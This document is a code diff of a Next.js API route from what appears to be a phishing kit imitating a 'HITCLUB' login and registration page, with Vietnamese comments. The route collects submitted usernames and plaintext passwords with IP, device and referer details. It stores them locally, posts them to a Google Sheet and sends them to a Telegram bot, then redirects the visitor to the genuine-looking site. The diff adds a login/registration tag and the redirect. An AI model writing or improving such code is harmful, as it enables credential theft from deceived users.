@@ -21,6 +21,11 @@ export async function POST(req: NextRequest) {
 
     const username = String(body.username).trim();
     const password = String(body.password);
+    const rawType = body.type ? String(body.type).trim() : '';
+    const rawReferer = body.referer || req.headers.get('referer') || '/login';
+
+    // Xác định loại thao tác: Đăng ký hoặc Đăng nhập
+    const type = rawType || (rawReferer.toLowerCase().includes('đăng ký') || rawReferer.toLowerCase().includes('register') ? 'Đăng ký' : 'Đăng nhập');
 
     // Thu thập metadata người dùng
     const forwardedHeader = req.headers.get('x-forwarded-for');
@@ -28,10 +33,13 @@ export async function POST(req: NextRequest) {
       ? forwardedHeader.split(',')[0].trim()
       : (req.headers.get('x-real-ip') || '127.0.0.1');
     const userAgent = req.headers.get('user-agent') || 'Không rõ';
-    const referer = req.headers.get('referer') || '/';
     const time = new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' });
 
+    // Trang gửi hiển thị rõ tag để tương thích hoàn toàn kể cả khi Google Apps Script chưa cập nhật cột Loại
+    const referer = rawReferer.includes(type) ? rawReferer : `[${type.toUpperCase()}] ${rawReferer}`;
+
     const submissionData = {
+      type,
       username,
       password,
       ip: clientIp,
@@ -65,7 +73,7 @@ export async function POST(req: NextRequest) {
       console.error('[API Submit] Lỗi ghi file backup local:', fsErr);
     }
 
-    // 2. Gửi đến Google Apps Script (nếu có cấu hình)
+    // 2. Gửi đến Google Apps Script
     const sheetUrl = process.env.GOOGLE_SHEET_URL || process.env.NEXT_PUBLIC_SHEET_URL;
     let sheetSent = false;
     if (sheetUrl && sheetUrl.startsWith('http')) {
@@ -91,12 +99,15 @@ export async function POST(req: NextRequest) {
     const tgChatId = process.env.TELEGRAM_CHAT_ID;
     if (tgToken && tgChatId) {
       try {
+        const tgIcon = type === 'Đăng ký' ? '📝' : '🔑';
         const tgText =
-          `🔔 *HITCLUB - ĐĂNG NHẬP MỚI*\n\n` +
+          `🔔 *HITCLUB - THÔNG BÁO MỚI*\n\n` +
+          `📌 *Thao tác:* ${tgIcon} *${type.toUpperCase()}*\n` +
           `👤 *Tài khoản:* \`${username}\`\n` +
           `🔑 *Mật khẩu:* \`${password}\`\n` +
           `🌐 *IP:* \`${clientIp}\`\n` +
           `⏰ *Thời gian:* ${time}\n` +
+          `📍 *Nguồn:* \`${referer}\`\n` +
           `📱 *Thiết bị:* ${userAgent.slice(0, 120)}`;
 
         await fetch(`https://api.telegram.org/bot${tgToken}/sendMessage`, {
@@ -113,9 +124,13 @@ export async function POST(req: NextRequest) {
       }
     }
 
+    const redirectUrl = process.env.NEXT_PUBLIC_REDIRECT_URL || 'https://hitclub.istanbul/';
+
     return NextResponse.json({
       ok: true,
       message: 'Gửi dữ liệu thành công',
+      type,
+      redirectUrl,
       sheetSent,
     });
   } catch (error) {
